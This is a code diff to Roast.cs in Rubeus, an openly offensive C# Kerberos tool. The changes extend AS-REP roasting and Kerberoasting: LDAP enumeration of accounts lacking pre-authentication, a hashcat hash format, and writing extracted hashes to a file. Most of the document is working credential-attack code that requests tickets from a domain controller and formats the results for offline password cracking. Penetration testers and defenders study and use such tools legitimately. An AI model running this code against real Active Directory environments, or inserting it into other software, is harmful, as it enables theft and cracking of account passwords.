@@ -11,43 +11,141 @@ namespace Rubeus
 {
     public class Roast
     {
-        public static void ASRepRoast(string userName, string domain, string domainController = "", string format = "john")
+        //public static void ASRepRoast(string userName, string domain, string domainController = "", string format = "john", string outFile = "")
+        //{
+        //    GetASRepHash(userName, domain, domainController, format, outFile);
+        //}
+
+        public static void ASRepRoast(string domain, string userName = "", string OUName = "", string domainController = "", string format = "john", System.Net.NetworkCredential cred = null, string outFile = "")
         {
-            GetASRepHash(userName, domain, domainController, format);
-        }
+            Console.WriteLine("[*] Action: AS-REP roasting\r\n");
 
-        public static void GetASRepHash(string userName, string domain, string domainController = "", string format = "")
-        {
-            // roast AS-REPs for users without pre-authentication enabled
+            DirectoryEntry directoryObject = null;
+            DirectorySearcher userSearcher = null;
+            string bindPath = "";
 
-            Console.WriteLine("[*] Action: AS-REP Roasting");
-
-            // grab the default DC if none was supplied
-            if (String.IsNullOrEmpty(domainController)) {
-                domainController = Networking.GetDCName();
-                if(String.IsNullOrEmpty(domainController))
+            if (!String.IsNullOrEmpty(userName))
+            {
+                GetASRepHash(userName, domain, domainController, format, outFile);
+            }
+            else
+            {
+                try
                 {
-                    Console.WriteLine("[X] Error retrieving the current domain controller.");
+                    if (cred != null)
+                    {
+                        if (!String.IsNullOrEmpty(OUName))
+                        {
+                            string ouPath = OUName.Replace("ldap", "LDAP").Replace("LDAP://", "");
+                            bindPath = String.Format("LDAP://{0}/{1}", cred.Domain, ouPath);
+                        }
+                        else
+                        {
+                            bindPath = String.Format("LDAP://{0}", cred.Domain);
+                        }
+                    }
+                    else if (!String.IsNullOrEmpty(OUName))
+                    {
+                        string ouPath = OUName.Replace("ldap", "LDAP").Replace("LDAP://", "");
+                        bindPath = String.Format("LDAP://{0}", ouPath);
+                    }
+
+                    if (!String.IsNullOrEmpty(bindPath))
+                    {
+                        directoryObject = new DirectoryEntry(bindPath);
+                    }
+                    else
+                    {
+                        directoryObject = new DirectoryEntry();
+                    }
+
+                    if (cred != null)
+                    {
+                        // if we're using alternate credentials for the connection
+                        string userDomain = String.Format("{0}\\{1}", cred.Domain, cred.UserName);
+                        directoryObject.Username = userDomain;
+                        directoryObject.Password = cred.Password;
+
+                        using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, cred.Domain))
+                        {
+                            if (!pc.ValidateCredentials(cred.UserName, cred.Password))
+                            {
+                                Console.WriteLine("\r\n[X] Credentials supplied for '{0}' are invalid!", userDomain);
+                                return;
+                            }
+                        }
+                    }
+
+                    userSearcher = new DirectorySearcher(directoryObject);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.InnerException.Message);
+                    return;
+                }
+
+                // check to ensure that the bind worked correctly
+                try
+                {
+                    Guid guid = directoryObject.Guid;
+                }
+                catch (DirectoryServicesCOMException ex)
+                {
+                    if (!String.IsNullOrEmpty(OUName))
+                    {
+                        Console.WriteLine("\r\n[X] Error creating the domain searcher for bind path \"{0}\" : {1}", OUName, ex.Message);
+                    }
+                    else
+                    {
+                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.Message);
+                    }
+                    return;
+                }
+
+                try
+                {
+                    userSearcher.Filter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("\r\n[X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
+                    return;
+                }
+
+                try
+                {
+                    SearchResultCollection users = userSearcher.FindAll();
+
+                    foreach (SearchResult user in users)
+                    {
+                        string samAccountName = user.Properties["samAccountName"][0].ToString();
+                        GetASRepHash(samAccountName, domain, domainController, format, outFile);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
                     return;
                 }
             }
 
-            System.Net.IPAddress[] dcIP = null;
-
-            try
+            if (!String.IsNullOrEmpty(outFile))
             {
-                dcIP = System.Net.Dns.GetHostAddresses(domainController);
+                Console.WriteLine("[*] Roasted hashes written to : {0}", Path.GetFullPath(outFile));
             }
-            catch (Exception e) {
-                Console.WriteLine("[X] Error retrieving IP for domain controller \"{0}\" : {1}", domainController, e.Message);
-                return;
-            }
-            Console.WriteLine("\r\n[*] Using domain controller: {0} ({1})", domainController, dcIP[0]);
+        }
+
+        public static void GetASRepHash(string userName, string domain, string domainController = "", string format = "", string outFile = "")
+        {
+            // roast AS-REPs for users without pre-authentication enabled
+            
+            string dcIP = Networking.GetDCIP(domainController);
+            if (String.IsNullOrEmpty(dcIP)) { return; }
 
             Console.WriteLine("[*] Building AS-REQ (w/o preauth) for: '{0}\\{1}'", domain, userName);
             byte[] reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.rc4_hmac);
 
-            byte[] response = Networking.SendBytes(dcIP[0].ToString(), 88, reqBytes);
+            byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);
             if (response == null)
             {
                 return;
@@ -76,19 +174,39 @@ namespace Rubeus
                 {
                     hashString = String.Format("$krb5asrep${0}@{1}:{2}", userName, domain, repHash);
                 }
+                else if(format == "hashcat")
+                {
+                    hashString = String.Format("$krb5asrep$23${0}@{1}:{2}", userName, domain, repHash);
+                }
                 else
                 {
-                    // eventual hashcat format
-                    hashString = String.Format("$krb5asrep${0}$*{1}${2}*${3}${4}", (int)Interop.KERB_ETYPE.rc4_hmac, userName, domain, repHash.Substring(0, 32), repHash.Substring(32));
+                  Console.WriteLine("Please provide a cracking format.");
                 }
 
-                Console.WriteLine("[*] AS-REP hash:\r\n");
-
-                // display the base64 of a hash, columns of 80 chararacters
-                foreach (string line in Helpers.Split(hashString, 80))
+                if (!String.IsNullOrEmpty(outFile))
                 {
-                    Console.WriteLine("      {0}", line);
+                    string outFilePath = Path.GetFullPath(outFile);
+                    try
+                    {
+                        File.AppendAllText(outFilePath, hashString + Environment.NewLine);
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("Exception: {0}", e.Message);
+                    }
+                    Console.WriteLine("[*] Hash written to {0}", outFilePath);
                 }
+                else
+                {
+                    Console.WriteLine("[*] AS-REP hash:\r\n");
+
+                    // display the base64 of a hash, columns of 80 chararacters
+                    foreach (string line in Helpers.Split(hashString, 80))
+                    {
+                        Console.WriteLine("      {0}", line);    
+                    }
+                }
+                Console.WriteLine();
             }
             else if (responseTag == 30)
             {
@@ -102,14 +220,14 @@ namespace Rubeus
             }
         }
 
-        public static void Kerberoast(string spn = "", string userName = "", string OUName = "", System.Net.NetworkCredential cred = null)
+        public static void Kerberoast(string spn = "", string userName = "", string OUName = "", System.Net.NetworkCredential cred = null, string outFile = "")
         {
             Console.WriteLine("[*] Action: Kerberoasting");
 
             if (!String.IsNullOrEmpty(spn))
             {
                 Console.WriteLine("\r\n[*] ServicePrincipalName   : {0}", spn);
-                GetDomainSPNTicket(spn);
+                GetDomainSPNTicket(spn, outFile);
             }
             else
             {
@@ -218,19 +336,23 @@ namespace Rubeus
                         Console.WriteLine("\r\n[*] SamAccountName         : {0}", samAccountName);
                         Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
                         Console.WriteLine("[*] ServicePrincipalName   : {0}", servicePrincipalName);
-                        GetDomainSPNTicket(servicePrincipalName, userName, distinguishedName, cred);
+                        GetDomainSPNTicket(servicePrincipalName, userName, distinguishedName, cred, outFile);
                     }
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine("\r\n  [X] Error executing the domain searcher: {0}", ex.InnerException.Message);
+                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
                     return;
                 }
             }
-            //else - search for user/OU/etc.
+
+            if (!String.IsNullOrEmpty(outFile))
+            {
+                Console.WriteLine("[*] Roasted hashes written to : {0}", Path.GetFullPath(outFile));
+            }
         }
 
-        public static void GetDomainSPNTicket(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null)
+        public static void GetDomainSPNTicket(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null, string outFile = "")
         {
             string domain = "DOMAIN";
 
@@ -298,18 +420,34 @@ namespace Rubeus
 
                                         string hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));
 
-                                        bool header = false;
-                                        foreach (string line in Helpers.Split(hash, 80))
+                                        if (!String.IsNullOrEmpty(outFile))
                                         {
-                                            if (!header)
+                                            string outFilePath = Path.GetFullPath(outFile);
+                                            try
                                             {
-                                                Console.WriteLine("[*] Hash                   : {0}", line);
+                                                File.AppendAllText(outFilePath, hash + Environment.NewLine);
                                             }
-                                            else
+                                            catch (Exception e)
                                             {
-                                                Console.WriteLine("                             {0}", line);
+                                                Console.WriteLine("Exception: {0}", e.Message);
                                             }
-                                            header = true;
+                                            Console.WriteLine("[*] Hash written to {0}", outFilePath);
+                                        }
+                                        else
+                                        {
+                                            bool header = false;
+                                            foreach (string line in Helpers.Split(hash, 80))
+                                            {
+                                                if (!header)
+                                                {
+                                                    Console.WriteLine("[*] Hash                   : {0}", line);
+                                                }
+                                                else
+                                                {
+                                                    Console.WriteLine("                             {0}", line);
+                                                }
+                                                header = true;
+                                            }
                                         }
                                         Console.WriteLine();
                                     }
